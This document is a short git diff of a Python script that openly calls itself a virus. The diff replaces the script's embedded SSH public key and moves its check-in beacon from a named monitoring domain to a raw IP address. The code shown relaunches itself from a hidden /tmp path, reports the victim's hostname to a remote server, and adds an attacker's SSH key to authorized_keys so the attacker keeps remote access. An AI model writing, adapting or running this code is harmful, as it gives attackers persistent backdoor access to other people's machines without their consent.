@@ -9,7 +9,7 @@ from socket import gethostname
 HOSTNAME = gethostname()
 VNAME = "cantstopthis"
 VIRUSNUM= 3 # CHANGE THIS TO CORRECT VALUE
-SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCemHyeAoMIIVJx0ZkMs3KWCHNv+tpDZgjSZJlmhB4jbqwXpiO3M3wfkVVnOFjIGQluS17MgX90/javCJ345lOeqSieSYJvz7UTQtGw1nZz6Bbf1BWgjfnqgCkVExp/Zv/sbPvLf40EcX7RsCTHCFxywClw2hrV9ywOSPQ2GPiMYShIYF88grmFzUL6XG/ryGL/hEnvg90zVnfv7pZ3Wgs2gx4o/CMpGg+3la1FO8b0oWwVoLPvV+5iCRzk1xntQ7QWPkpMPu+sH+He93DfAo+jM9oHYPtUBd2cGPKroM/mB0N9mGlfag9tTUyNpkX2TjG3nE8fnM/m8On7Y3WMiMW7 dontdelete"""
+SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtKvjef/vlR2NKdqVUbvKn6q/M25fFwXRog3+rgg3GMZXUYdkjGrcVpm+OcP0lDAiKHCkaVFRKTB88qY22W3orpgt/V8j4HYNroSusS1RbcazAysikiiNGbyzxSQwHHaZd07BBvtOOWFr34uwUth081Ca59pLK4wbVgnvbFLwjPLcQkmSND3NTEXjBXG1PjYTeZMa9/atlSEKSaqzKcNF+B8x3DHoJiDc2Wy38FOaiBXT9H1OHJmiFawQfRU6duoLJTzAnQ1t4aWrewLDt1CAt2Ehhwrz2cJiwsnZrGXNDHYVUwgph9PngpvJVlP+lw4smRf7lCs0RGMGpUonenvo/ fred"""
 
 # Return whether the ssh key is already in the authorized_keys file
 def ssh_key_added():
@@ -28,7 +28,7 @@ while 1:
     os.system("/usr/bin/flock -n /tmp/vlock.lock /tmp/\,/" + VNAME + " &")
 
     # Let the monitoring server know I am still alive
-    requests.get("http://monitor.daviddworken.com:8080/api/submit", {"id" : HOSTNAME, "virusName" : VIRUSNUM})
+    requests.get("http://68.183.100.83:8080/api/submit", {"id" : HOSTNAME, "virusName" : VIRUSNUM})
 
     # Append an ssh key to authorized_keys file if it is not already there
     # What's the fun of having a virus if it doesn't give me some sort of remote access?
